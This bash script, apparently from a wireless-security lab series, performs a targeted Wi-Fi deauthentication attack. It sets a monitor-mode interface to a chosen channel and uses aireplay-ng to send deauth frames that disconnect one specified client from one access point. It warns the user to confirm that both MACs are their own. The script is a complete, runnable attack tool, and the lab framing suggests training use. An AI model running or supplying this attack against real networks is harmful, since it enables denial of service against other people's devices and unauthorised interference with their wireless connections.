#!/usr/bin/env bash
# Targeted deauth: kicks ONE specific client off ONE specific AP.
# Cleanest, most ethical variant — affects exactly the device you name.
#
# Usage:
#   sudo ./04-deauth-targeted.sh -a <bssid> -c <client-mac> -i <iface> -k <channel> [-n <frames>]
#
# Example:
#   sudo ./04-deauth-targeted.sh \
#       -a AA:BB:CC:11:22:33 -c DD:EE:FF:44:55:66 -i wlan1mon -k 11

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -c <client-mac> -i <iface> -k <channel> [-n <frames>]"
}

BSSID="" CLIENT="" IFACE="" CHANNEL="" COUNT=10
while getopts "a:c:i:k:n:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        n) COUNT=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$CLIENT" || -z "$IFACE" || -z "$CHANNEL" ]] && usage

warn "Targeted deauth:"
warn "  AP BSSID    = $BSSID"
warn "  Client MAC  = $CLIENT"
warn "  Channel     = $CHANNEL"
warn "  Frames      = $COUNT"
warn "Confirm BOTH MACs are listed in lab-notes/inventory.md as YOURS."
sleep 3

info "Locking $IFACE to channel $CHANNEL..."
iw dev "$IFACE" set channel "$CHANNEL"

aireplay-ng --deauth "$COUNT" -a "$BSSID" -c "$CLIENT" "$IFACE"
